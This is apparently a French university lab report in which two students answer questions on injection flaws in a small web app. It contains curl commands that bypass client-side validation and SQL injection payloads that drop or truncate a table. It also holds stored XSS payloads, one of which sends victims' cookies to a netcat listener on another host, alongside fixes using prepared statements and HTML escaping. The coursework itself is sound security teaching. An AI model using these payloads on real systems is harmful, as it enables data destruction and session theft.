# Rendu "Injection"

## Binome

- ABDULLAH Mohamed <mohamad.abdullah.etu@univ-lille.fr>
- LAKHDAR Selim <selim.lakhdar.etu@univ-lille.fr>


## Question 1

* Le mécanisme utilisé est un controle grâce à une regex. On ne peut entrer que des chiffres ou des lettres.

* Non, car le côntrole est effectué côté client. Il suffit de désactiver les scripts JS.

## Question 2

* Commande curl qui bypass la vérification

```
- curl -X POST -d "chaine=Mohamed" http://172.28.101.47:8080/

- curl -X POST -d "chaine=Mohamed@Selim" http://172.28.101.47:8080/
```

## Question 3

* Votre commande curl pour effacer la table (V1)

```
- curl -X POST -d "chaine=%22%29%3B+DROP+TABLE+chaines%3B--" http://172.28.101.47:8080/
- curl -X POST -d "chaine=%22%29%3B+TRUNCATE+TABLE+chaines%3B--" http://172.28.101.47:8080/
- curl -X POST -d 'chaine=");+TRUNCATE+TABLE+chaines%3B--' http://172.28.101.47:8080/
- curl -X POST -d 'chaine=");+DROP+TABLE+chaines%3B--' http://172.28.101.47:8080/
```

* commande pour bypass le champ who 
```
- curl -X POST -d "chaine=hacked','000000')#" http://172.28.101.47:8080/ 
```
* Expliquez comment obtenir des informations sur une autre table

- Il suffit d'échapper la commande SQL et de rajouter un SELECT * FROM othertable.
- De plus on sait que MySQL crée une table information_schema qui garde toutes les infos sur une Table.

```
- curl -X POST -d "chaine=hacked','000000')+AND+SELECT+*+FROM+chaines2#" http://172.28.101.47:8080/
```

## Question 4

Rendre un fichier server_correct.py avec la correction de la faille de sécurité. Expliquez comment vous avez corrigé la faille.  

- Il faut utiliser des rêquetes préparées. 

```
requete = """INSERT INTO chaines (txt,who) VALUES (%s,%s)"""
cursor.execute(requete, [post["chaine"], cherrypy.request.remote.ip])
```
## Question 5

* Commande curl pour afficher une fenetre de dialog.

```
- curl -X POST -d "chaine=<script>alert('bonjour')</script>" http://172.28.101.47:8080/
```

* Commande curl pour lire les cookies

```
- curl -X POST -d "chaine=<script>alert(document.cookie)</script>" http://172.28.101.47:8080/
```

* Commande curl pour voler les cookies

```
- nc -l -p 6666 (sur la machine 172.28.101.111)
- curl -X POST -d "chaine=<script>location.replace(\"http://172.28.101.111:6666?c=\"+document.cookie)</script>" http://172.28.101.47:8080
```

## Question 6

Rendre un fichier server_xss.py avec la correction de la faille. Expliquez la demarche que vous avez suivi.

- Il faut échapper les caractères spéciaux grâce à html.escape()

